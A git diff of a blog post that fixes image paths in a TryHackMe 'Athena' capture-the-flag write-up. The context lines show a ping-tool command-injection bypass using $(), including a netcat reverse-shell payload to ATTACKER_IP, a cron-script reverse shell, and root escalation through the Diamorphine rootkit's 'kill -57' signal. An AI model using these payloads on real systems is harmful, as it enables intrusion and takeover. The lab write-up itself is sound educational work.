@@ -52,7 +52,7 @@ There are four ports open:
 
 Since it's pretty quick to enumerate, I fire up NetExec to enumerate SMB in order to see if Guest authentication is allowed.
 
-![](../assets/img/2026-02-02-Athena/1.png)
+![](/assets/img/2026-02-02-Athena/1.png)
 
 It is indeed enabled and we have read permissions on a public share. Looking inside it shows a text file containing a message for an administrator, not meant for us but this could be quite useful. Here are the contents:
 
@@ -71,21 +71,21 @@ One of the employees has developed a new Pinging system and gives us a new direc
 
 Checking out the landing page shows some history on the Greek goddess Athena, and also gives us a few names to stash on a list in case we need to brute force at some point.
 
-![](../assets/img/2026-02-02-Athena/2.png)
+![](/assets/img/2026-02-02-Athena/2.png)
 
 My directory scans kept timing out for some odd reason and this page is static so we won't be able to exploit any functionality here. Let's head over to the router panel.
 
 This seems to only host a newly developed pinging tool meant to check availaibilty to other devices.
 
-![](../assets/img/2026-02-02-Athena/3.png)
+![](/assets/img/2026-02-02-Athena/3.png)
 
 The other tabs on this page redirect us to an under construction message, so we'll have to work with what we've got. Capturing a request to ping my own IP address, I find that this function makes a POST request to a ping.php page using an ip parameter.
 
-![](../assets/img/2026-02-02-Athena/4.png)
+![](/assets/img/2026-02-02-Athena/4.png)
 
 After entering a valid IP, the stdout from the ping command gets printed to the screen. Now that we know the system is using a normal ping command to reach devices, I try appending a semicolon and a whoami command to test for injection.
 
-![](../assets/img/2026-02-02-Athena/5.png)
+![](/assets/img/2026-02-02-Athena/5.png)
 
 That clearly does not work. I try to ping `localhost` for fun and find that doing so actually works. This site is most likely prone to some kind of DDoS attack but that's not really what we're looking for. It's clear any attempt of adding special characters to chain commands such as `";", "&", "|"` will only block the attempt, so I start researching other ways to get around this.
 
@@ -94,7 +94,7 @@ I come across an [article](https://www.gnu.org/software/bash/manual/html_node/Co
 
 For example, if I make a file and store the command cat [FILE] inside of a variable which then gets called by another cat command, it will still throw an error, but our command gets executed and printed as part of it.
 
-![](../assets/img/2026-02-02-Athena/6.png)
+![](/assets/img/2026-02-02-Athena/6.png)
 
 So how do we exploit this with the pinging tool? We know that it doesn't sanitize the input correctly as when we supply a semicolon or other operators to chain commands, it detects a hacking attempt instead of an error consistent with pinging (like "Failed to execute ping"). If we provide a valid IP and then our command wrapped in the variable parenthesis, we can have it execute arbitrary commands.
 
@@ -104,7 +104,7 @@ I test this theory in Burp Suite with a command that makes the application sleep
 ip=127.0.0.1$(sleep 5)&submit=
 ```
 
-![](../assets/img/2026-02-02-Athena/7.png)
+![](/assets/img/2026-02-02-Athena/7.png)
 
 This works and the response matches. Next, I try a reverse shell that doesn't have any special characters that will be filtered. I end up going with a simple netcat command that will spawn a bash shell once connected, but when executed it doesn't work.
 
@@ -112,7 +112,7 @@ This works and the response matches. Next, I try a reverse shell that doesn't ha
 ip=127.0.0.1$(nc ATTACKER_IP PORT -e /bin/bash)&submit=
 ```
 
-![](../assets/img/2026-02-02-Athena/8.png)
+![](/assets/img/2026-02-02-Athena/8.png)
 
 You could also execute a bind shell on the system for this step, just make sure it's a port above 1000 as it will probably need Sudo to run it. Now we can start looking at routes for privilege escalation. I have my eyes on Athena's account as she's the only other user besides root. I should mention that I upgraded my shell using the typical `Python3 import pty` method as well so we're able to use things like text editors.
 
@@ -144,18 +144,18 @@ echo "Backup completed..."
 
 Backup scripts are usually automated processes except I didn't see a crontab executing this so I'm going to guess that there is a personal cronjob doing so. Since we can write to this file, I add a line containing a reverse shell pointed towards my attacking machine, setup a netcat listener and wait. 
 
-![](../assets/img/2026-02-02-Athena/9.png)
+![](/assets/img/2026-02-02-Athena/9.png)
 
 Yay, now we that we have a shell as Athena we can grab the user flag under her home directory and start looking at ways to escalate privileges to root. She has the ability to use the insmod special binary on a secret file under `/mnt` . 
 
-![](../assets/img/2026-02-02-Athena/10.png)
+![](/assets/img/2026-02-02-Athena/10.png)
 
 A bit of quick research shows that this allows a user to insert modules into the Linux kernel. Some groups use this in order to load rootkits as a backdoor on compromised systems. As the file allowed is already a kernel object (.ko extension), I download it to my attacking machine for further inspection.
 
 ## Rootkit Inspection
 I use Ghidra to inspect this file by making a new project, importing the `venom.ko` file and inspecting it through the Code Browser. This discloses all functions used throughout the file and I discover a `diamorphine_init` label.
 
-![](../assets/img/2026-02-02-Athena/11.png)
+![](/assets/img/2026-02-02-Athena/11.png)
 
 Diamorphine is an LKM rootkit intended for use on Linux Kernels `2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)`. While researching what this rootkit does, I found [this article](https://www.sciencedirect.com/science/article/abs/pii/S1353485821001458) explaining how it stays hidden.
 
@@ -163,13 +163,13 @@ Diamorphine is a rootkit that changes program behaviour by modifying kernel data
 
 [This GitHub repository](https://github.com/m0nad/Diamorphine) also  goes a bit into detail on how its used. I spent some time trying to wrap my head around how this works.
 
-![](../assets/img/2026-02-02-Athena/12.png)
+![](/assets/img/2026-02-02-Athena/12.png)
 
 There is a pointer named `puVar2` on line 27 that is directed to the system call table. Along with that, I see that it stores and references the original addresses for `getdents, getdents64, and kill`. In short this function redirects any system call to kill towards the `hacked_kill` function, same goes for the `getdents` versions.
 
 This allows the rootkit to intercept a system call and change the behavior of it. Skipping ahead, the `hacked_kill` function is used for checking incoming signals; If the value of iVar3 is `0x39`, then it will call a `give_root` function meant for privilege escalation. On the other hand, if the value of iVar 3 is 0x3f it will toggle the built-in hidden feature.
 
-![](../assets/img/2026-02-02-Athena/13.png)
+![](/assets/img/2026-02-02-Athena/13.png)
 
 Alright so when executing the Sudo command to load this module, it will stay hidden from us using the lsmod command to find all loaded modules. Also we can potentially get privesc to root user by supplying the hacked_kill function with a value of `0x39` (being 57 in Hex).
 
@@ -186,6 +186,6 @@ kill -63 0
 kill -57 0
 ```
 
-![](../assets/img/2026-02-02-Athena/14.png)
+![](/assets/img/2026-02-02-Athena/14.png)
 
 Using the rootkit to change our `UID` to 0 (matching root user), we can privesc and grab the final flag under `/root` directory. This box was really cool as I've never used a rootkit as a way to escalate privileges. Big thanks to [MatheuZSec](https://tryhackme.com/p/MatheuZSec) for making this room for us. I hope this was helpful to anyone stuck like I was for a bit or following along and happy hacking!
